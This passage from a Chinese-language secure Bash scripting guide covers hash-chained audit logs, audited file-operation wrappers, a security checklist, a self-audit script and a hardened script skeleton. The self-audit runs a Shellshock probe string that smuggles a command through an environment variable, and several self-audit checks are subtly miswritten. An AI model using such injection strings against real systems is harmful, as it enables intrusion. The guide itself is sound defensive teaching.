        ((line_num++))
        if [[ -n "$prev_hash" ]]; then
            if [[ "$hash" != "$prev_hash" ]]; then
                echo "[篡改] 第 $line_num 行：链式哈希不匹配"
                echo "  预期前一哈希: $prev_hash"
                echo "  实际前一哈希: $hash"
                return 1
            fi
        fi

        # 重新计算哈希
        local calc_hash
        calc_hash="$(printf '%s|%s|%s' "$timestamp" "$hash" "$entry" | \
            sha256sum | awk '{print $1}')"

        if [[ "$calc_hash" != "$current_hash" ]]; then
            echo "[篡改] 第 $line_num 行：内容哈希不匹配"
            return 1
        fi

        prev_hash="$current_hash"
    done < "$CHAIN_LOG"

    echo "链式日志完整性验证通过：共 $line_num 条记录"
    return 0
}

# 策略 2: 远程日志转发（syslog / systemd journal）
audit_remote_forward() {
    local entry="$*"

    # systemd journal（不可篡改的本地日志）
    if command -v systemd-cat >/dev/null 2>&1; then
        printf 'AUDIT: %s\n' "$entry" | systemd-cat -t "myscript" -p "auth.info"
    fi

    # 传统 syslog
    if command -v logger >/dev/null 2>&1; then
        logger -t "myscript" -p "auth.info" "AUDIT: $entry"
    fi

    # 远程 syslog 服务器（配置在 /etc/rsyslog.conf 或 /etc/syslog-ng/）
    # *.*  @192.168.1.10:514
}

# 策略 3: 文件系统级别的不可变性（需要 root 权限）
make_log_append_only() {
    # Linux chattr：设置 append-only 属性
    if [[ "$(id -u)" == "0" ]]; then
        chattr +a "$AUDIT_LOG" 2>/dev/null || true
        # 此后文件只能追加，不能删除或截断
        # chattr -a 解除这个属性
        echo "审计日志已设置为 append-only"
    fi
}

# 策略 4: 采样和计数校验
readonly AUDIT_CHECKSUM_FILE="/var/log/myapp/.audit_counter"

audit_multi_layer() {
    local action="$*"

    # 主日志
    audit_logger "ACTION" "$action"

    # 计数器
    local count=0
    if [[ -f "$AUDIT_CHECKSUM_FILE" ]]; then
        count="$(<"$AUDIT_CHECKSUM_FILE")"
    fi
    echo "$(( count + 1 ))" > "$AUDIT_CHECKSUM_FILE"

    # 远程转发
    audit_remote_forward "$action (seq=$count)"
}
```

## 11.3 完整的操作审计示例

```bash
#!/bin/bash
# ── 带审计的文件操作包装器 ──

# 记录操作前状态
audit_file_pre_state() {
    local file="$1"
    local checksum="N/A"
    local size="N/A"
    local owner="N/A"

    if [[ -f "$file" ]]; then
        checksum="$(sha256sum "$file" | awk '{print $1}')"
        size="$(stat -c '%s' "$file" 2>/dev/null || echo 'N/A')"
        owner="$(stat -c '%U:%G' "$file" 2>/dev/null || echo 'N/A')"
    fi

    printf '%s|%s|%s' "$checksum" "$size" "$owner"
}

audit_file_post_state() {
    local file="$1"
    audit_file_pre_state "$file"
}

# 包装文件写入操作
safe_write_audited() {
    local file="$1" content="$2"

    local pre_state
    pre_state="$(audit_file_pre_state "$file")"

    # 执行写入
    printf '%s\n' "$content" > "$file"

    local post_state
    post_state="$(audit_file_post_state "$file")"

    audit_change "file_write" \
        "file=$file pre=($pre_state) post=($post_state) pid=$$"
}

# 包装文件删除操作
safe_delete_audited() {
    local file="$1"

    if [[ -f "$file" ]]; then
        local pre_state
        pre_state="$(audit_file_pre_state "$file")"

        rm -f "$file"

        audit_change "file_delete" \
            "file=$file pre_state=($pre_state)"
    fi
}

# 包装权限修改操作
safe_chmod_audited() {
    local mode="$1" file="$2"

    local old_mode
    old_mode="$(stat -c '%a' "$file" 2>/dev/null || echo 'N/A')"

    chmod "$mode" "$file"
    local ret=$?

    local new_mode
    new_mode="$(stat -c '%a' "$file" 2>/dev/null || echo 'N/A')"

    audit_admin "chmod" \
        "file=$file old_mode=$old_mode new_mode=$new_mode mode_arg=$mode result=$ret"

    return $ret
}
```

# 12. 安全编码清单

以下清单汇总了 Shell 脚本安全编程的所有关键检查项，应在代码审查和日常开发中系统化地逐项检查。

## 12.1 代码级安全检查清单

```bash
#!/bin/bash
# ═══════════════════════════════════════════════════════════
# Shell 安全编码检查清单 — 代码审查用
# ═══════════════════════════════════════════════════════════

# □ 1. Shebang 与基础设置
#    □ #!/bin/bash 或 #!/usr/bin/env bash
#    □ set -euo pipefail 在文件开头
#    □ IFS=$' \t\n' 显式设置
#    □ umask 0077（或适合的严格值）
#    □ PATH 设为只读的安全路径
#    □ 危险环境变量被清理（BASH_ENV, ENV, PROMPT_COMMAND, LD_PRELOAD）
#    □ PS4 不包含命令替换
#    □ 检查 Bash 版本 >= 4.0（或声明依赖）

# □ 2. 输入处理
#    □ 所有用户输入在使用前经过验证
#    □ 使用白名单而非黑名单进行验证
#    □ 命令行参数被解析和验证
#    □ 文件路径经过 realpath/readlink 规范化
#    □ 路径遍历（../ 等）被检测并拒绝
#    □ 文件名被限制在安全的字符集内
#    □ 对空输入、超长输入有处理
#    □ SQL/命令参数不被拼接（使用参数化方式）

# □ 3. 命令执行
#    □ 绝不使用 eval 处理外部输入
#    □ 不使用 source / . 加载不可信文件
#    □ sh -c 和 bash -c 的参数经过严格验证
#    □ 外部命令使用绝对路径或安全的 PATH
#    □ 反引号 `` 被替换为 $()（可读性 + 避免转义问题）
#    □ 命令输出不会重新作为命令执行

# □ 4. 引号与展开
#    □ 所有变量展开使用双引号： "$var", "$@", "${arr[@]}"
#    □ 命令替换使用双引号： "$(command)"
#    □ 数组元素访问使用引号： "${array[@]}"
#    □ glob 展开不使用逗号等分隔符的内部值（防止 IFS 注入）
#    □ heredoc 对于静态内容使用 'EOF'（阻止变量展开）
#    □ 不存在未引用的变量展开

# □ 5. 临时文件
#    □ 使用 mktemp 创建临时文件和目录
#    □ 绝不使用可预测的文件名（包括基于 PID 的）
#    □ 使用 trap EXIT 确保临时文件清理
#    □ 临时文件权限设为 0600（通过 umask）
#    □ 在使用前检查 /tmp 的 sticky bit
#    □ 考虑使用 $HOME/tmp 替代 /tmp

# □ 6. 文件与权限
#    □ 敏感文件权限设为 0600 或 0400
#    □ 目录权限正确设置（0700, 0750, 0755）
#    □ 输出文件前检查目录是否存在
#    □ 不使用全局可写的目录存放敏感数据
#    □ chmod/chown/chgrp 的参数经过验证

# □ 7. 密码与密钥
#    □ 密钥不硬编码在脚本中
#    □ 密码不在命令行中传递
#    □ 使用配置文件（权限 0600）存储凭证
#    □ 环境变量中的密码在使用后立即清除
#    □ 密钥从专用的密钥管理服务获取（Vault, KMS）
#    □ set +x 在密码处理代码块中临时禁用 xtrace

# □ 8. 网络通信
#    □ curl/wget 使用时验证 SSL 证书（不随意使用 -k/--insecure）
#    □ SSH 使用时验证主机密钥（不使用 StrictHostKeyChecking=no）
#    □ 敏感数据通过 HTTPS 传输
#    □ 对 API 响应的内容进行验证
#    □ 网络超时设置合理（--connect-timeout, --max-time）

# □ 9. 错误处理
#    □ 所有外部命令的退出码被检查
#    □ 管道命令使用 pipefail
#    □ 关键操作失败时脚本终止（不静默继续）
#    □ 错误信息输出到 stderr（>&2）
#    □ 错误信息不暴露内部细节给用户
#    □ 异常退出时有清理逻辑

# □ 10. 日志与审计
#    □ 敏感信息不记录到日志
#    □ 关键操作有审计日志
#    □ 日志使用追加模式（>>）而非覆盖
#    □ 日志时间使用 UTC（避免时区混淆）
#    □ 日志包含足够的上下文（用户、PID、来源 IP）
#    □ 考虑远程日志转发（防本地篡改）

# □ 11. 信号处理
#    □ 至少处理 EXIT, INT, TERM 信号
#    □ KILL 信号无法捕获的残留文件有清理计划
#    □ trap 内部的操作是幂等的（多次调用安全）
#    □ 信号处理函数中避免使用非异步安全的命令

# □ 12. 完整性
#    □ 部署脚本时验证校验和
#    □ 关键脚本有 GPG 签名
#    □ 外部依赖的版本和校验和被锁定
#    □ 脚本自身的权限被正确设置（通常 0755）
#    □ 脚本文件所有者为可信用户（非 root 除非必要）

# □ 13. 依赖检查
#    □ 脚本启动时检查所有必需的外部命令
#    □ 外部命令版本兼容性被验证
#    □ which/type/command -v 确保外部命令未被劫持
#    □ 不使用已弃用的命令（如 ifconfig, route → ip）

# □ 14. 配置来源
#    □ source 加载的配置文件路径不被用户控制
#    □ 配置文件不允许写入可执行代码（使用 key=value 格式）
#    □ 从不可信来源获取的配置文件需额外验证
```

## 12.2 运行时安全检查脚本

```bash
#!/bin/bash
# ── 自检脚本：对当前 Bash 环境进行安全审计 ──

security_self_audit() {
    local issues=0
    local pass=0

    header() { printf '\n=== %s ===\n' "$1"; }
    check() {
        local desc="$1"; shift
        if "$@"; then
            printf "  [通过] %s\n" "$desc"
            ((pass++))
        else
            printf "  [失败] %s\n" "$desc"
            ((issues++))
        fi
    }

    header "环境变量安全"
    check "LD_PRELOAD 未设置"       [[ -z "${LD_PRELOAD:-}" ]]
    check "BASH_ENV 未设置"        [[ -z "${BASH_ENV:-}" ]]
    check "PROMPT_COMMAND 未设置"   [[ -z "${PROMPT_COMMAND:-}" ]]
    check "IFS 为默认值"           [[ "$IFS" == $' \t\n' ]]
    check "PATH 不以 . 开头"       [[ "$PATH" != .:* ]] && [[ "$PATH" != *::* ]]
    check "PATH 不包含相对路径"    [[ "$PATH" != *:.:* ]]

    header "文件与权限"
    check "umask 是安全的 (0077 或更严)"   [[ "$(umask)" -ge 77 ]]
    check "~/.ssh 目录权限为 0700"         [[ "$(stat -c '%a' "$HOME/.ssh" 2>/dev/null || echo 700)" == 700 ]]
    check "HOME 目录权限非全局可写"        ! stat -c '%A' "$HOME" 2>/dev/null | grep -q '........w.'
    check "当前脚本权限 <= 0755"          [[ "$(stat -c '%a' "$0")" -le 755 ]]
    check "当前脚本所有者为当前用户"      [[ "$(stat -c '%U' "$0")" == "$(whoami)" ]]

    header "运行时检查"
    check "Bash 版本 >= 4.4"               [[ "${BASH_VERSINFO[0]}" -ge 5 ]] || \
                                           [[ "${BASH_VERSINFO[0]}" -eq 4 && "${BASH_VERSINFO[1]}" -ge 4 ]]
    check "set -u 已启用 (nounset)"        [[ "$-" == *u* ]]
    check "set -e 已启用 (errexit)"       [[ "$-" == *e* ]]
    check "set -o pipefail 已启用"         [[ "$(set -o | grep pipefail)" == *on ]]

    header "临时目录安全"
    check "/tmp 存在 sticky bit"          [[ "$(stat -c '%a' /tmp 2>/dev/null | head -c1)" == 1 ]]
    check "未发现遗留临时文件 (>1 天)"     [[ -z "$(find /tmp -maxdepth 1 -name 'tmp.*' -mtime +1 2>/dev/null | head -1)" ]]

    header "Bash 安全特性"
    # 检查受限 shell 相关的安全配置（仅信息）
    local bash_version
    bash_version="${BASH_VERSINFO[0]}.${BASH_VERSINFO[1]}.${BASH_VERSINFO[2]}"
    printf "  [信息] Bash 版本: %s\n" "$bash_version"
    printf "  [信息] ShellShock 补丁: "
    env x='() { :;}; echo VULNERABLE' bash -c : 2>/dev/null | grep -q VULNERABLE \
        && echo "可能存在漏洞" || echo "已修复"

    printf '\n══════════════════════════\n'
    printf '审计结果: %d 通过, %d 失败\n' "$pass" "$issues"

    return "$issues"
}

# 运行自检
security_self_audit
```

## 12.3 快速参考卡

**永远不会做的事：**
- 不对用户输入使用 `eval`
- 不用 `sh -c` 执行拼接的命令字符串
- 不在命令行中传递密码
- 不用固定文件名做临时文件
- 不从不可信来源 `source` 文件
- 关闭 SSL 验证 (`curl -k`)
- 忽略命令的退出码

**永远要做的事：**
- 脚本开头：`set -euo pipefail`
- 脚本开头：`IFS=$' \t\n'` 和安全的 `PATH`
- 每个外部输入：验证后再使用
- 每个变量展开：加上双引号 `"$var"`
- 每个临时文件：`mktemp` + `trap cleanup EXIT`
- 每个敏感文件：`chmod 600` 或 `umask 0077`
- 每个关键操作：写审计日志
- 每个异常退出：清理资源

**"安全即默认" 脚本骨架：**

```bash
#!/usr/bin/env bash
# 安全脚本骨架 — 适用于需要处理敏感数据的生产环境脚本
set -euo pipefail
IFS=$'\n\t'
umask 0077

# 只读安全路径
readonly PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
export PATH

# 清理危险环境变量
unset BASH_ENV ENV PROMPT_COMMAND CDPATH GLOBIGNORE
unset LD_PRELOAD LD_LIBRARY_PATH

# 设置安全的 PS4（xtrace 前缀）
PS4='+${BASH_SOURCE}:${LINENO}:'

# 检查当前 Bash 版本
if (( BASH_VERSINFO[0] < 4 )); then
    echo "[错误] 需要 Bash >= 4.0" >&2
    exit 1
fi

# 检查是否被 source 执行
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    # 作为脚本直接执行
    main() {
        # ── 在这里写你的安全代码 ──
        :
    }
    main "$@"
else
    echo "[错误] 此脚本不应被 source 加载" >&2
    exit 1
fi
```
